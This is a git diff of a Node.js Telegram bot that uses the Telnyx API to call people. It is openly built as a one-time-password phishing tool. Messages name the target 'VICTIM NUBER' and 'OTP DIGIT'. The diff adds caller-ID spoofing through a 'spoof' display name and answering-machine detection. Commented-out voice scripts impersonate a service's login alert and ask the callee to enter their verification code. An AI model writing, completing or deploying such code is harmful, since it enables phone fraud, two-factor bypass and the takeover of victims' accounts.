@@ -10,43 +10,38 @@ const telnyx = require('telnyx')(MY_API_KEY);
 const { Telegraf } = require('telegraf'); // importing telegraf.js
 var bot = new Telegraf(bot_token)
 
-
 const express = require('express');
 const app = express();
 const port = process.env.PORT || 3000;
 
-async function call (customer_number, ctx, service, digit){
+
+async function call (spoof, customer_number, ctx, service, digit){
    console.log(ctx, 'first yayyyy')
-   bot.telegram.sendMessage(ctx.chat.id, `Call has Started...`, {
-      reply_markup:{
-         inline_keyboard: [
-            [
-               {
-                  text: 'End Call',
-                  callback_data: 'end'
-               }               
-            ]
-         ]
-      }
-   })
-
-
    // Use the Telnyx API to create a new call
    try {
+      await bot.telegram.sendMessage(ctx.chat.id, `Call has Started...`, {
+         reply_markup:{
+            inline_keyboard: [
+               [
+                  {
+                     text: 'End Call',
+                     callback_data: 'end'
+                  }               
+               ]
+            ]
+         }
+      })   
       const { data: call } = await telnyx.calls.create({
          connection_id: alt_control_id,
          to: `+${customer_number}`,
          from: service_number,
-         // webhook_url: WEBHOOK_URL
+         from_display_name: `+${spoof}`,
+         answering_machine_detection: 'detect'
       });      
    } catch (error) {
       console.log("your error is: ", error)
    }
 
-
-   // call.answered({
-
-   // })
 }
 
 
@@ -97,13 +92,13 @@ bot.command('call', ctx => {
    else{
       bot.telegram.sendMessage(ctx.chat.id, 
          `
-      ✅CALL STARTING\n 
-      ✅VICTIM NUBER - ${number}\n 
-      ✅SERIVCE - ${service}\n
-      ✅OTP DIGIT - ${digit}
+✅CALL STARTING\n 
+✅VICTIM NUBER - ${number}\n 
+✅SERIVCE - ${service}\n
+✅OTP DIGIT - ${digit} 
          `, {})
 
-      call(number, ctx, service, 6)
+      call(spoof, number, ctx, service, 6)
    }
 
 
@@ -119,17 +114,52 @@ app.get('/', (req, res) => {
 });
 
 app.post('/', (req, res) => {
-   const digits = req.body;
-   console.log(yayyyy)
+   const body = req.body;   
    res.json({status: 'ok', code: 200})
 });
 
-app.post('/call', (req, res) => {
-   const digits = req.body.Digits;
-   res.json(req.body)
-});
+// app.post('/call', (req, res) => {
+//    const body = req.body;
+//    console.log(body)
+//    res.json(req.body)
+// });
 
-app.post('/webhooks/answered', (req, res) => {
+app.post('/answered', (req, res) => {
+   // Get the call_control_id from the webhook data
+   const data = req.body.data;
+   console.log(`expected webhook : ${data}`)
+
+   // const call_control_id = data.payload.call_control_id;
+   
+   // call.gather_using_speak(
+   // { 
+   //    call_control_id: call_control_id,
+   //    payload: `Hello ${name}, there has been a login to your ${service} account from a different location, press 1 if this was not you.`, 
+   //    language: 'en-US', 
+   //    voice: 'female'
+   // });
+
+})
+
+app.post('/webhooks/pressed_one', (req, res) => {
+   // Get the call_control_id from the webhook data
+   const data = req.body.data;
+   console.log(`expected webhook : ${data}`)
+
+   // const call_control_id = data.payload.call_control_id;
+   
+   // call.gather_using_speak(
+   // { 
+   //    call_control_id: call_control_id,
+   //    payload: 'We have just sent you a one time password, kindly type the ${digit} digit code', 
+   //    language: 'en-US', 
+   //    voice: 'female',
+   //    webhook_url: '' 
+   // });
+
+})
+
+app.post('/webhooks/machine_detected', (req, res) => {
    // Get the call_control_id from the webhook data
    const data = req.body.data;
    console.log(`expected webhook : ${data}`)
